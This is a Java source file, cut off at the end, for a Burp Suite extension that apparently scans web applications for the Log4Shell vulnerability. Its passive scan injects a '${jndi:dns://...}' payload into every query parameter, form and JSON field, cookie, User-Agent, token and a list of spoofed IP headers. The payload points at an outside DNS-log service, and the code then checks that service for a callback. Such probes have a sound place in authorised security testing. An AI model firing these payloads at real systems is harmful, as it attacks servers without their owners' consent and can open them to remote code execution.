package burp;

import com.alibaba.fastjson.JSON;
import com.alibaba.fastjson.JSONObject;
import java.awt.*;
import java.awt.event.MouseAdapter;
import java.awt.event.MouseEvent;
import java.io.*;
import java.net.URL;
import java.util.ArrayList;
import java.util.Arrays;
import java.util.List;
import java.util.Objects;
import java.util.regex.Matcher;
import java.util.regex.Pattern;
import javax.swing.*;
import javax.swing.table.AbstractTableModel;
import javax.swing.table.TableModel;
import okhttp3.Call;
import okhttp3.OkHttpClient;
import okhttp3.Request;
import okhttp3.Response;
import org.apache.commons.lang3.RandomStringUtils;

public class BurpExtender extends AbstractTableModel implements IBurpExtender, IScannerCheck, ITab, IMessageEditorController {
    private IBurpExtenderCallbacks callbacks;

    private IExtensionHelpers helpers;

    private PrintWriter stdout;

    private JSplitPane mjSplitPane;

    private List<TablesData> Udatas = new ArrayList<>();

    private IMessageEditor HRequestTextEditor;

    private IMessageEditor HResponseTextEditor;

    private IHttpRequestResponse currentlyDisplayedItem;

    private URLTable Utable;

    private JScrollPane UscrollPane;

    private JSplitPane HjSplitPane;

    private JSplitPane HjSplitPane2;

    private JPanel mjPane;

    private JTabbedPane Ltable;

    private JTabbedPane Rtable;

    private JTextArea textArea1;

    private JButton mbutton;

    private JButton mbutton2;

    private JTextArea textArea2;

    private JPanel panel1;

    private String logxn_dnslog;

    private String logxn_dnslog_token;

    private Boolean logxn ;

    private Boolean burpdns;

    private String burp_dnslog;

    private String dnslogcn ;

    private Boolean privatedns;

    private Boolean ceyeio ;

    private String ceyetoken;

    private String jarPath;

    private Boolean isuseUserAgentTokenXff; //(是否测试UA头、X-Forward-for头以及X-Client-IP头)

    private Boolean isuseXfflists;

    private Boolean isuseAllCookie; //(是否全部cookie都进行测试)

    private IBurpCollaboratorClientContext collaboratorContext;

    public void registerExtenderCallbacks(IBurpExtenderCallbacks callbacks) {
        boolean isuseUserAgentTokenXff = true;

        boolean isuseXfflists = false;

        boolean isuseAllCookie = true;

        boolean privatedns = false;


//        IBurpCollaboratorClientContext collaboratorContext = null ;
        OkHttpClient client = new OkHttpClient();
        String logxn_dnslog = "";
        String logxn_dnslog_token = "";
//        String burppayload = "";
        Boolean logxn = true;
        Boolean ceyeio = false;
        String ceyetoken = "";
//        Boolean burpdns = true;

        String os = System.getProperty("os.name");
        File f ;

        if (os.toLowerCase().startsWith("win")) {
            f = new File("log4j2burpscanner.properties");
        }else{
            String jarPath = callbacks.getExtensionFilename(); // 获取当前jar的路径
            f = new File(jarPath.substring(0, jarPath.lastIndexOf("/")) + "/" + "log4j2burpscanner.properties");
        }

        if (!f.exists())
        {
            try {
                f.createNewFile();
                try (FileWriter fileWriter = new FileWriter(f)) {
                    fileWriter.append("isceye=false");
                    fileWriter.append("\n");
                    fileWriter.append("ceyetoken=xxxxxx");
                    fileWriter.append("\n");
                    fileWriter.append("ceyednslog=xxxx.ceye.io");
                    fileWriter.append("\n");
                    fileWriter.append("isprivatedns=false");
                    fileWriter.append("\n");
                    fileWriter.append("privatednslogurl=xxxx.xxx");
                    fileWriter.append("\n");
                    fileWriter.append("privatednsResponseurl=http://xxxx.xxx/?token=a");
                    fileWriter.append("\n");
                    fileWriter.append("isuseUserAgentTokenXff=1");
                    fileWriter.append("\n");
                    fileWriter.append("isuseXfflists=0");
                    fileWriter.append("\n");
                    fileWriter.append("isuseAllCookie=1");
                    fileWriter.append("\n");
                    fileWriter.flush();
                } catch (IOException e) { e.printStackTrace(); }
            } catch (IOException e) { e.printStackTrace(); }
        }
        // 查询logxn是否可以访问
        try{
        String indexUrl = "https://log.xn--9tr.com/new_gen";
        Request loginReq = new Request.Builder()
                .url(indexUrl)
                .get()
                .build();

        Call call = client.newCall(loginReq);
        Response response = null;
        try {
            response = call.execute();
        } catch (IOException e) {
            e.printStackTrace();
        }
        String respCookie = null;
        try {
            respCookie = response.body().string();
        } catch (IOException e) {
            e.printStackTrace();
        }
        JSONObject jsonObject = JSON.parseObject(String.valueOf(respCookie));

        logxn_dnslog = jsonObject.getString("domain"); // 读取domain，dnslog
            logxn_dnslog = logxn_dnslog.substring(0,logxn_dnslog.length()-1);
        logxn_dnslog_token = jsonObject.getString("token"); // 读取token，dnslog_token
        }catch (Exception e){
            logxn_dnslog = "log.xn--9tr.com can't access，need to configure ceye api";
            logxn_dnslog_token = "log.xn--9tr.com can't access，need to configure ceye api";
            logxn = false;
    }

        // 生成burp自身的dnslog
//        try {
//            collaboratorContext = callbacks.createBurpCollaboratorClientContext();
//            burp_dnslog = collaboratorContext.generatePayload(true);
//        }catch (Exception e){
//            burp_dnslog = "burp dnslog 生成失败";
//            burpdns = false;
//        }
        this.isuseUserAgentTokenXff = isuseUserAgentTokenXff; // 是否测试UA头、X-Forward-for头以及X-Client-IP头
        this.isuseXfflists = isuseXfflists; // 是否用xff列表测试，包含其他标识IP头
        this.isuseAllCookie = isuseAllCookie; // 是否全部cookie都进行测试
        this.logxn_dnslog = logxn_dnslog;
        this.logxn_dnslog_token = logxn_dnslog_token;
        this.logxn = logxn ;
        this.ceyeio = ceyeio ;
        this.privatedns = privatedns;
//        this.burpdns = burpdns ;
        this.ceyetoken = ceyetoken;
        this.callbacks = callbacks;
        this.helpers = callbacks.getHelpers();
        this.stdout = new PrintWriter(callbacks.getStdout(), true);
        callbacks.setExtensionName("log4jscanner");
        this.stdout.println("===========================");
        this.stdout.println("[+]   load successful!     ");
        this.stdout.println("[+]   log4jscanner v0.14   ");
        this.stdout.println("[+]      code by f0ng      ");
        this.stdout.println("[+]                       ");
        this.stdout.println("===========================");

//        this.stdout.println("burp的dnslog为" + burp_dnslog);

        this.stdout.println("dns address : " + this.logxn_dnslog);
        this.stdout.println("dns token : " + this.logxn_dnslog_token);

        if (this.logxn_dnslog.contains("configure ceye api")){

        }else {
            this.stdout.println("You also can request to    https://log.xn--9tr.com/" + this.logxn_dnslog_token + "    to see dnslog");
        }
        SwingUtilities.invokeLater(new Runnable() {
            public void run() {
                BurpExtender.this.textArea1 = new JTextArea("");
//                BurpExtender.this.textArea2 = new JTextArea("");
                BurpExtender.this.mbutton = new JButton("点击保存（Click to Save）");
                BurpExtender.this.mbutton.setSize(100,100);
                BurpExtender.this.mbutton.addMouseListener(new MouseAdapter() {
                    @Override
                    public void mouseClicked(MouseEvent e){
                        stdout.println("Save Success!");
                        String fileContent = BurpExtender.this.textArea1.getText();
                        try (FileWriter fileWriter = new FileWriter(f.getAbsolutePath())) {
                            fileWriter.append(fileContent);
                        } catch (IOException ee) {
                            ee.printStackTrace();
                        }
                    }
                });

                BurpExtender.this.mbutton2 = new JButton("点击按钮配置文件恢复默认（Click to restore default）");
                BurpExtender.this.mbutton2.addMouseListener(new MouseAdapter() {
                    @Override
                    public void mouseClicked(MouseEvent e){
                        String morenconfig = "isceye=false\n" +
                                "ceyetoken=xxxxxx\n" +
                                "ceyednslog=xxxx.ceye.io\n" +
                                "isprivatedns=false\n" +
                                "privatednslogurl=xxxx.xxx\n" +
                                "privatednsResponseurl=http://xxxx.xxx/?token=a\n" +
                                "isuseUserAgentTokenXff=1\n" +
                                "isuseXfflists=0\n" +
                                "isuseAllCookie=1\n";
                        BurpExtender.this.textArea1.setText(morenconfig);
                    }
                });
                BurpExtender.this.mjSplitPane = new JSplitPane(0); //上下
                BurpExtender.this.Utable = new BurpExtender.URLTable(BurpExtender.this);
                BurpExtender.this.UscrollPane = new JScrollPane(BurpExtender.this.Utable);
                BurpExtender.this.HjSplitPane = new JSplitPane();
                BurpExtender.this.HjSplitPane2 = new JSplitPane();
                BurpExtender.this.HjSplitPane.setDividerLocation(650);
                BurpExtender.this.Ltable = new JTabbedPane();
                BurpExtender.this.HRequestTextEditor = BurpExtender.this.callbacks.createMessageEditor(BurpExtender.this, false);
                BurpExtender.this.Ltable.addTab("Request", BurpExtender.this.HRequestTextEditor.getComponent());
                BurpExtender.this.Rtable = new JTabbedPane();
                BurpExtender.this.HResponseTextEditor = BurpExtender.this.callbacks.createMessageEditor(BurpExtender.this, false);
                BurpExtender.this.Rtable.addTab("Response", BurpExtender.this.HResponseTextEditor.getComponent());
                BurpExtender.this.Rtable.add("dnslog配置(remember to click button)", BurpExtender.this.textArea1);
                BurpExtender.this.Rtable.add("保存配置", BurpExtender.this.mbutton);
                BurpExtender.this.Rtable.add("恢复默认配置", BurpExtender.this.mbutton2);

                BufferedReader reader = null;
                StringBuffer sbf = new StringBuffer();
                String output = "";
                try {
                    reader = new BufferedReader(new FileReader(f));
                    String tempStr;
                    while ((tempStr = reader.readLine()) != null) {
                        sbf.append(tempStr + '\n');
                    }
                    reader.close();
                    output =  sbf.toString();
                } catch (IOException e) {}
                BurpExtender.this.textArea1.setText(output);
                BurpExtender.this.HjSplitPane.add(BurpExtender.this.Ltable, "left"); // request窗体
                BurpExtender.this.HjSplitPane.add(BurpExtender.this.Rtable, "right"); // response窗体
                BurpExtender.this.mjSplitPane.add(BurpExtender.this.UscrollPane, "left"); // 结果集
                BurpExtender.this.mjSplitPane.add(BurpExtender.this.HjSplitPane, "right"); // request response一起

                BurpExtender.this.callbacks.customizeUiComponent(BurpExtender.this.mjSplitPane);
                BurpExtender.this.callbacks.addSuiteTab(BurpExtender.this);


            }
        });
        callbacks.registerScannerCheck(this);
    }

    public String vulnurl_param (String vulnurl, int i){
        String vulnurl_total = "";
        String[] vulnurls = vulnurl.split("dns://");
        vulnurl_total = vulnurl_total + vulnurls[0] + "dns://" + i + "." + vulnurls[1];
        return vulnurl_total;
    }

    public List<IScanIssue> doPassiveScan(IHttpRequestResponse baseRequestResponse) {
        File f;
        int param_i = 0;
        String privatednsResponseurl = "";
        String os = System.getProperty("os.name");
        if (os.toLowerCase().startsWith("win")) {
            f = new File("log4j2burpscanner.properties");
        }else{
            String jarPath = callbacks.getExtensionFilename(); // 获取当前jar的路径
            f = new File(jarPath.substring(0, jarPath.lastIndexOf("/")) + "/" + "log4j2burpscanner.properties");
        }
        BufferedReader reader = null;
        StringBuffer sbf = new StringBuffer();
        String output = "";
        try {
            reader = new BufferedReader(new FileReader(f));
            String tempStr;
            while ((tempStr = reader.readLine()) != null) {
                sbf.append(tempStr + '\n');
            }
            reader.close();
            output =  sbf.toString();
            if (output.contains("isceye=true")){
                String[] headerss = output.split("ceyednslog=");
                String header_ceyednslog = headerss[1];
                this.logxn = false;
                this.ceyeio = true;
                this.logxn_dnslog = header_ceyednslog.split("isprivatedns=")[0];
                String[] headers_token = headerss[0].split("isceye=true\nceyetoken=");
                this.ceyetoken = headers_token[1].trim();
            }
            if (output.contains("isprivatedns=true")){
                this.logxn = false;
                this.ceyeio = true;
                this.privatedns = true;
                String[] headersss = output.split("privatednsResponseurl=")[0].split("privatednslogurl=");
                this.logxn_dnslog = headersss[1].trim();
                privatednsResponseurl = output.split("privatednsResponseurl=")[1].split("isuseUserAgentTokenXff")[0].trim();
            }
            if (output.contains("isuseUserAgentTokenXff=0")){
                this.isuseUserAgentTokenXff = false;
            }
            if (output.contains("isuseXfflists=1")){
                this.isuseXfflists = true;
            }
            if (output.contains("isuseAllCookie=0")){
                this.isuseAllCookie = false;
            }
        } catch (IOException e) {}

        IHttpService httpService = baseRequestResponse.getHttpService();
        String host = httpService.getHost();

//        if (host.equals("log.xn--9tr.com"))
//            return null;

        byte[] request = baseRequestResponse.getRequest();
        URL url = this.helpers.analyzeRequest(baseRequestResponse).getUrl();
        IRequestInfo analyzedIRequestInfo = this.helpers.analyzeRequest(request);

        List<String> request_header = analyzedIRequestInfo.getHeaders(); // 获取请求头
        // 循环获取参数，判断类型，进行加密处理后，再构造新的参数，合并到新的请求包中。

        String firstrequest_header = request_header.get(0); //第一行请求包含请求方法、请求uri、http版本
        String[] firstheaders = firstrequest_header.split(" ");

//        String randomstr = RandomStringUtils.randomAlphanumeric(6);
//        String randomstr =  "${sys:java.version}";
//        String hostname = "${hostName}";
        // logxn 的dnslog
//        stdout.println(firstheaders[1].split("/?")[0].replace("/","."));
        String uri = firstheaders[1].split("\\?")[0].replace("/",".");
        if (firstheaders[1].split("\\?")[0].replace("/",".").length() > 25) {
            uri = uri.substring(0, 25);
            if (uri.endsWith("."))
                uri = uri.substring(0,uri.length()-1);
        }
        if (uri.endsWith("."))
            uri = uri.substring(0,uri.length()-1);
        String vulnurl = "${jndi:dns://" + firstheaders[0].trim() + "." + host  + uri + "."+ this.logxn_dnslog.trim() + "/%20test}";

//        String vulnurl = "${jndi:dns://"  + randomstr +"." + host + "." + this.burp_dnslog + "/test}";

        String uri_total = "";


        if(firstrequest_header.contains(".png") || firstrequest_header.contains(".js") || firstrequest_header.contains(".jpg") || firstrequest_header.contains(".jpeg") || firstrequest_header.contains(".svg")  || firstrequest_header.contains(".mp4") || firstrequest_header.contains(".css") || firstrequest_header.contains(".mp3")|| firstrequest_header.contains(".ico")||firstrequest_header.contains(".woff")){
            return null;
        }
//        else if (!checUrl(httpService.getHost(), httpService.getPort())){
//            return null;
//        }
        else {


            //firstheaders[0] 为请求方法
            //firstheaders[1] 为请求的uri
            //firstheaders[2] 为请求协议版本，不用看

            /*****************获取body 方法一**********************/
            int bodyOffset = analyzedIRequestInfo.getBodyOffset();
            byte[] byte_Request = baseRequestResponse.getRequest();

            String request2 = new String(byte_Request); //byte[] to String
            String body = request2.substring(bodyOffset); // 请求体
//            stdout.println(firstheaders[0]);
            if(firstheaders[0].contains("GET") && !firstheaders[1].contains("?"))
                return null;
            // 这里一直到POST的行，因为GET、POST、PUT都可能请求的uri有参数
            if (firstheaders[1].contains("?")) {
                String[] requris = firstheaders[1].split("\\?");
                String[] requries = requris[1].split("&");
                for (String uri_single : requries) {
                    String[] uri_single_lists = uri_single.split("=");
                    uri_total = uri_total + uri_single_lists[0] + "=" + vulnurl_param(vulnurl,param_i++) + "&";
                }
                uri_total = uri_total.substring(0, uri_total.length() - 1);
                firstheaders[1] = requris[0] + "?" + uri_total;
            }
            firstheaders[1] = firstheaders[1].replace("{","%7b").replace("}","%7d"); // 替换GET参数里的{和}
            if(firstheaders[0].contains("POST") || firstheaders[0].contains("PUT")){
//                stdout.println("进入POST模式");
//                stdout.println(body);
                // todo

                /**  .contains("=")    !.contains("{")
                 * a=1&b=2&c=3
                 */
                 if (body.contains("=") && !body.contains("{")) {
//                     stdout.println("进入post普通模式");
                     String body_total = "";
                     String[] bodys_single = body.split("&");
                     for(String body_single:bodys_single) {
                         String[] body_single_lists = body_single.split("=");
                         body_total = body_total + body_single_lists[0] + "="  + vulnurl_param(vulnurl,param_i++) +  "&" ;
                     }
                     body_total = body_total.substring(0,body_total.length()-1);
                     body =  body_total;
                 }

                 /** !.contains("=")    .contains("{")
                 * {"a":"1","b":"22222"}
                 */
                 else if( !body.contains("={") && body.contains("{") && !body.contains("&") && body.contains("\":\"") && !body.contains(":{\"")){
//                     stdout.println("进入json模式");
                     JSONObject jsonObject = JSON.parseObject(body);
                     for (String key:jsonObject.keySet()) {
                         jsonObject.put(key, vulnurl_param(vulnurl,param_i++));
                     }
//                     stdout.println(jsonObject.toString());
                     body = jsonObject.toString();
                 }

                 /** .contains("=")    .contains("{")
                 * a=1&param={"a":"1","b":"22222"}
                 */
                 else if( body.contains("={") && body.contains("&")){
//                     stdout.println("进入普通和json混合模式");
                     String body_total = "";
                     String[] bodys_single = body.split("&");
                     for(String body_single:bodys_single) {
                         if (body_single.contains("{")){
                             String[] body_single_lists = body_single.split("=");
                             JSONObject jsonObject = JSON.parseObject(body_single_lists[1]);
                             for (String key:jsonObject.keySet()) {
                                 jsonObject.put(key, vulnurl_param(vulnurl,param_i++));
                             }
                             body_total = body_total + body_single_lists[0] + "=" + jsonObject.toString() + "&";
                         }else {
                             String[] body_single_lists = body_single.split("=");
                             body_total = body_total + body_single_lists[0] + "=" + vulnurl_param(vulnurl,param_i++) + "&";
                         }
                     }
                     body_total = body_total.substring(0,body_total.length()-1);
                     body =  body_total;
                 }

                 /**
                  * body={"a":"1","b":"22222"}
                  */
                 else if(body.contains("={") && !body.contains("&") && !body.contains("\":{")){
                     String body_total = "";
                         if (body.contains("{")){
                             String[] body_single_lists = body.split(body.split("=")[0] + "=");
                             JSONObject jsonObject = JSON.parseObject(body_single_lists[1]);
                             for (String key:jsonObject.keySet()) {
                                 jsonObject.put(key, vulnurl_param(vulnurl,param_i++));
                             }
                             body_total = body_total + body.split("=")[0] + "=" + jsonObject.toString();
                         }else {
                             String[] body_single_lists = body.split("=");
                             body_total = body_total + body_single_lists[0] + "=" + vulnurl_param(vulnurl,param_i++) ;
                         }
                     body = body_total;
                 }

                 /**
                  * body={"params":{"a":"1","b":"22222"}}
                  */
                 else if (body.contains("={\"") && !body.contains("&") && body.contains("\":{")){
                     String body_code = body;
                     body = body.split(body.split("=")[0] + "=")[1];

                     JSONObject jsonObject = JSON.parseObject(body);
                     for (String key:jsonObject.keySet()) {
                         if (jsonObject.getString(key).contains("{")){
                             JSONObject jsonObject2 = JSON.parseObject(jsonObject.getString(key));
                             for (String key2:jsonObject2.keySet())
                                 jsonObject2.put(key2,vulnurl_param(vulnurl,param_i++));
                             jsonObject.put(key,jsonObject2);
                         } else
                             jsonObject.put(key, vulnurl_param(vulnurl,param_i++));
                     }
                     body = body_code.split("=")[0] + "=" + jsonObject.toString();
                 }
                 /** !.contains("&")    .contains("\":{")  !.contains("={")
                 * {"params":{"a":"1","b":"22222"}}
                 */
                 else if( body.contains("\":{") && !body.contains("={\"")) {
//                     stdout.println("进入双层json模式");
                     JSONObject jsonObject = JSON.parseObject(body);
                     for (String key:jsonObject.keySet()) {
                         if (jsonObject.getString(key).contains("{")){
                             JSONObject jsonObject2 = JSON.parseObject(jsonObject.getString(key));
                             for (String key2:jsonObject2.keySet())
                                 jsonObject2.put(key2,vulnurl_param(vulnurl,param_i++));
                             jsonObject.put(key,jsonObject2);
                         } else
                             jsonObject.put(key, vulnurl_param(vulnurl,param_i++));
                     }
                     body = jsonObject.toString();
                 }

            }

            request_header.set(0,firstheaders[0] + " " + firstheaders[1] + " " + firstheaders[2]);
            // 去除源请求包里的Origin参数
            /*****************增加header**********************/
//            request_header.add("X-Forwarded-For-Ip: 127.0.0.1" + vulnurl); // 请求头增加
//            request_header.add("X-Forwarded-For: 127.0.0.1" + vulnurl); // 请求头增加
//            request_header.add("Forwarded: 127.0.0.1" + vulnurl); // 请求头增加
//            request_header.add("X-Client-IP: 127.0.0.1" + vulnurl); // 请求头增加
            List<String> xff_lists = Arrays.asList("X-Forwarded","X-Requested-With","X-Requested-With", "X-Forwarded-Host",
                    "X-remote-IP","X-remote-addr","True-Client-IP","Client-IP","X-Real-IP",
                    "Ali-CDN-Real-IP","Cdn-Src-Ip","Cdn-Real-Ip","CF-Connecting-IP","X-Cluster-Client-IP",
                    "WL-Proxy-Client-IP", "Proxy-Client-IP","Fastly-Client-Ip","True-Client-Ip","X-Originating-IP",
                    "X-Host","X-Custom-IP-Authorization","X-original-host","X-forwarded-for","If-Modified-Since");

            for (String xff:xff_lists)
                if (!request_header.contains(xff + ":") && this.isuseXfflists )  // 是否用xff列表测试，包含其他标识IP头
                    request_header.add(xff + ": 127.0.0.1 " + vulnurl_param(vulnurl,param_i++));

            if (!request_header.contains("X-Forwarded-For:") && this.isuseUserAgentTokenXff)
                request_header.add( "X-Forwarded-For: 127.0.0.1 " + vulnurl_param(vulnurl,param_i++));

            if (!request_header.contains("X-Client-IP:") && this.isuseUserAgentTokenXff)
                request_header.add( "X-Client-IP: 127.0.0.1 " + vulnurl_param(vulnurl,param_i++));

            StringBuilder cookie_total = new StringBuilder();
            String lowup = "up"; // 默认Cookie为大写
//            Boolean xforwardedfor = false;
//            Boolean forwarded_for = false;
            for (int i = 0; i < request_header.size(); i++) {
//                String[] request_header_single = request_header.get(i).split(":");
//                if (request_header_single[0].equals("X-Forwarded-For")) //判断是否有Forwarded
//                    xforwardedfor = true;
//
//                if (request_header_single[0].equals("Forwarded-For")) //判断是否有Forwarded
//                    forwarded_for = true;

                if (request_header.get(i).contains("User-Agent:") || request_header.get(i).contains("token:") || request_header.get(i).contains("Token:") || request_header.get(i).contains("Bearer Token:"))
                    if (this.isuseUserAgentTokenXff) // 是否测试UA头、token、X-Forward-for头以及X-Client-IP头
                        request_header.set(i,request_header.get(i) + vulnurl_param(vulnurl,param_i++)); // UA头增加 token增加(jwt)

                if (request_header.get(i).contains("X-Forwarded-For:") && this.isuseUserAgentTokenXff){
                    request_header.set(i,request_header.get(i) + vulnurl_param(vulnurl,param_i++)); // UA头增加 token增加(jwt)
                }

                if (request_header.get(i).contains("X-Client-IP:") && this.isuseUserAgentTokenXff){
                    request_header.set(i,request_header.get(i) + vulnurl_param(vulnurl,param_i++)); // UA头增加 token增加(jwt)
                }


                for (String xff:xff_lists)
                    if (request_header.contains(xff + ":"))
                        request_header.set(i,request_header.get(i) + vulnurl_param(vulnurl,param_i++));

                if (request_header.get(i).contains("cookie:") || request_header.get(i).contains("Cookie:") ) {
                    if (request_header.get(i).contains("cookie:")) {
                        lowup = "low";
                    }else if (request_header.get(i).contains("Cookie:") ){
                        lowup = "up";
                    }
                    if (this.isuseAllCookie) { // 对所有cookie发起请求
//                        stdout.println("isuseallCookie为" + this.isuseAllCookie);
                        String cookies = request_header.get(i).replace("cookie:", "").replace("Cookie:", "");//去掉cookie: 、Cookie:
                        String[] cookies_lists = cookies.split(";"); // 根据; 分割cookie
                        for (String cookie_single : cookies_lists) {  // 把分割出来的单个cookie的值进行vulnurl添加
                            String[] cookie_single_lists = cookie_single.split("=");
                            cookie_total.append(cookie_single_lists[0]).append("=").append(vulnurl_param(vulnurl, param_i++)).append("; ");
                        }
                        if (lowup.contains("up"))
                            request_header.set(i, "Cookie:" + cookie_total); // Cookie头增加
                        else
                            request_header.set(i, "cookie:" + cookie_total); // cookie头增加
                    }else{ // 只对单条cookie发起请求
                        String cookies = request_header.get(i).replace("cookie:", "").replace("Cookie:", "");//去掉cookie: 、Cookie:
                        String[] cookies_lists = cookies.split(";"); // 根据; 分割cookie
                        String[] cookie_single_0 = cookies_lists[0].split("=");
                        cookies_lists[0] = cookie_single_0[0] + "=" + cookie_single_0[1] + vulnurl_param(vulnurl, param_i++);
                        for (String cookie_single : cookies_lists) {  // 把分割出来的单个cookie的值进行vulnurl添加
                            cookie_total.append(cookie_single).append("; ");
                        }
                        if (lowup.contains("up"))
                            request_header.set(i, "Cookie:" + cookie_total); // Cookie头增加
                        else
                            request_header.set(i, "cookie:" + cookie_total); // cookie头增加
                    }
                }
            }
//            if (!forwarded) // 如果forwarded为false，即没有的话，就添加该payload
//                request_header.add( "Forwarded: 127.0.0.1 " + vulnurl_param(vulnurl,param_i++));
//
//            if (!forwarded_for) // 如果forwarded_for为false，即没有的话，就添加该payload
//                request_header.add( "Forwarded-For: 127.0.0.1 " + vulnurl_param(vulnurl,param_i++));

            byte[] request_bodys = body.getBytes();  //String to byte[]
            String reqMethod = this.helpers.analyzeRequest(baseRequestResponse).getMethod();
            //        stdout.println(newParameter);
            byte[] newRequest = this.helpers.buildHttpMessage(request_header, request_bodys);

            IHttpRequestResponse newIHttpRequestResponse = this.callbacks.makeHttpRequest(httpService, newRequest);
            byte[] response = newIHttpRequestResponse.getResponse();


            if (logxn) { // logxn 的dnslog记录
                OkHttpClient client = new OkHttpClient();
                String indexUrl = "https://log.xn--9tr.com/" + this.logxn_dnslog_token.trim();
//                stdout.println(indexUrl);
                Request loginReq = new Request.Builder()
                        .url(indexUrl)
                        .get()
                        .build();
                try {
                    Robot  r   =   new   Robot();
                    r.delay(2000);
                } catch (AWTException e) {
                    e.printStackTrace();
                }
                Call call = client.newCall(loginReq);


                Response response2 = null;
                try {
                    response2 = call.execute();
                } catch (IOException e) {
                    e.printStackTrace();
                }
                try {
                    assert response2 != null;
                    String respCookie = Objects.requireNonNull(response2.body()).string(); // dnslog的响应体

                    if (respCookie.contains(host)) {
                        synchronized (this.Udatas) {
//                        List<Object> mes = FindKey(newIHttpRequestResponse, getRememberMeNumber(response));
                            int row = this.Udatas.size();
                            this.Udatas.add(new TablesData(row, reqMethod, url.toString(), this.helpers.analyzeResponse(response).getStatusCode() + "", "log4j2 rce", newIHttpRequestResponse, httpService.getHost(), httpService.getPort()));
                            fireTableRowsInserted(row, row);
                            List<IScanIssue> issues = new ArrayList(1);
                            issues.add(new CustomScanIssue(
                                    httpService,
                                    url,
                                    new IHttpRequestResponse[]{newIHttpRequestResponse},
                                    "log4j2 RCE",
                                    "log4j2 RCE",
                                    "High"
                            ));
                            return issues;
                        }
                    }
                } catch (IOException e) {
                    e.printStackTrace();
                }
            }

            if (ceyeio) { // ceye 的dnslog记录
                OkHttpClient client = new OkHttpClient();
                String indexUrl = "http://api.ceye.io/v1/records?token=" + this.ceyetoken.trim() + "&type=dns&filter=" + host ;
                Request loginReq = new Request.Builder()
                        .url(indexUrl)
                        .get()
                        .build();
                try {
                    Robot  r   =   new   Robot();
                    r.delay(2000);
                } catch (AWTException e) {
                    e.printStackTrace();
                }
                Call call = client.newCall(loginReq);


                Response response2 = null;
                try {
                    response2 = call.execute();
                } catch (IOException e) {
                    e.printStackTrace();
                }
                try {
                    assert response2 != null;
                    String respCookie = Objects.requireNonNull(response2.body()).string(); // dnslog的响应体

                    if (respCookie.contains(host)) {
                        synchronized (this.Udatas) {
//                        List<Object> mes = FindKey(newIHttpRequestResponse, getRememberMeNumber(response));
                            int row = this.Udatas.size();
                            this.Udatas.add(new TablesData(row, reqMethod, url.toString(), this.helpers.analyzeResponse(response).getStatusCode() + "", "log4j2 rce", newIHttpRequestResponse, httpService.getHost(), httpService.getPort()));
                            fireTableRowsInserted(row, row);
                            List<IScanIssue> issues = new ArrayList(1);
                            issues.add(new CustomScanIssue(
                                    httpService,
                                    url,
                                    new IHttpRequestResponse[]{newIHttpRequestResponse},
                                    "log4j2 RCE",
                                    "log4j2 RCE",
                                    "High"
                            ));
                            return issues;
                        }
                    }
                } catch (IOException e) {
                    e.printStackTrace();
                }
            }

            if (privatedns) { // privatedns 的dnslog记录
                OkHttpClient client = new OkHttpClient();
                String indexUrl = privatednsResponseurl ;
                Request loginReq = new Request.Builder()
                        .url(indexUrl)
                        .get()
                        .build();

                Call call = client.newCall(loginReq);
                try {
                    Robot  r   =   new   Robot();
                    r.delay(1000);
                } catch (AWTException e) {
                    e.printStackTrace();
                }
                Response response2 = null;
                try {
                    response2 = call.execute();
                } catch (IOException e) {
                    e.printStackTrace();
                }
                try {
                    assert response2 != null;
                    String respCookie = Objects.requireNonNull(response2.body()).string(); // dnslog的响应体

                    if (respCookie.contains(host)) {
                        synchronized (this.Udatas) {
//                        List<Object> mes = FindKey(newIHttpRequestResponse, getRememberMeNumber(response));
                            int row = this.Udatas.size();
                            this.Udatas.add(new TablesData(row, reqMethod, url.toString(), this.helpers.analyzeResponse(response).getStatusCode() + "", "log4j2 rce", newIHttpRequestResponse, httpService.getHost(), httpService.getPort()));
                            fireTableRowsInserted(row, row);
                            List<IScanIssue> issues = new ArrayList(1);
                            issues.add(new CustomScanIssue(
                                    httpService,
                                    url,
                                    new IHttpRequestResponse[]{newIHttpRequestResponse},
                                    "log4j2 RCE",
                                    "log4j2 RCE",
                                    "High"
                            ));
                            return issues;
                        }
                    }
                } catch (IOException e) {
                    e.printStackTrace();
                }
            }

//            if (burpdns) { // logxn 的dnslog记录
//                stdout.println("burpdns" + burpdns);
//                try {
//                    Robot  r   =   new   Robot();
//                    r.delay(500);
//                } catch (AWTException e) {
//                    e.printStackTrace();
//                }
//                List<IBurpCollaboratorInteraction> collaboratorInteractions = collaboratorContext.fetchCollaboratorInteractionsFor(burp_dnslog);
//                for (IBurpCollaboratorInteraction collaboratorInteraction : collaboratorInteractions) {
//                    stdout.println(collaboratorInteraction.getProperty("raw_query"));
//                    stdout.println(host);
//                    byte[] base64decodedBytes = Base64.getDecoder().decode(collaboratorInteraction.getProperty("raw_query"));
//                    if (UnicodeDecode(new String(base64decodedBytes, StandardCharsets.UTF_8)).contains(host.replace(".","")))
//                        stdout.println(host + "存在漏洞");
//                }
//
////                    if (respCookie.contains(host)) {
////                        synchronized (this.Udatas) {
//////                        List<Object> mes = FindKey(newIHttpRequestResponse, getRememberMeNumber(response));
////                            int row = this.Udatas.size();
////                            this.Udatas.add(new TablesData(row, reqMethod, url.toString(), this.helpers.analyzeResponse(response).getStatusCode() + "", "log4j2 rce", newIHttpRequestResponse, httpService.getHost(), httpService.getPort()));
////                            fireTableRowsInserted(row, row);
////                            List<IScanIssue> issues = new ArrayList(1);
////                            issues.add(new CustomScanIssue(
////                                    httpService,
////                                    url,
////                                    new IHttpRequestResponse[]{newIHttpRequestResponse},
////                                    "log4j2 RCE",
////                                    "log4j2 RCE",
////                                    "High"
////                            ));
////                            return issues;
////                        }
////                    }
////                } catch (IOException e) {
////                    e.printStackTrace();
////                }
//            }

            return null;
        }

    }
    //Unicode转中文
    public static String UnicodeDecode(String ascii) {
        List<String> ascii_s = new ArrayList<String>();
        String zhengz = "\\\\u[0-9,a-f,A-F]{4}";
        Pattern p = Pattern.compile(zhengz);
        Matcher m = p.matcher(ascii);
        while (m.find()) {
            ascii_s.add(m.group());
        }
        for (int i = 0, j = 2; i < ascii_s.size(); i++) {
            String code = ascii_s.get(i).substring(j, j + 4);
            char ch = (char) Integer.parseInt(code, 16);
            ascii = ascii.replace(ascii_s.get(i), String.valueOf(ch));
        }
        return ascii;
    }

    public List<IScanIssue> doActiveScan(IHttpRequestResponse baseRequestResponse, IScannerInsertionPoint insertionPoint) {
        return null;
    }

    public int consolidateDuplicateIssues(IScanIssue existingIssue, IScanIssue newIssue) {
        if (existingIssue.getIssueName().equals(newIssue.getIssueName()))
            return -1;
        return 0;
    }

    boolean checUrl(String host, int port) {
        for (TablesData d : this.Udatas) {
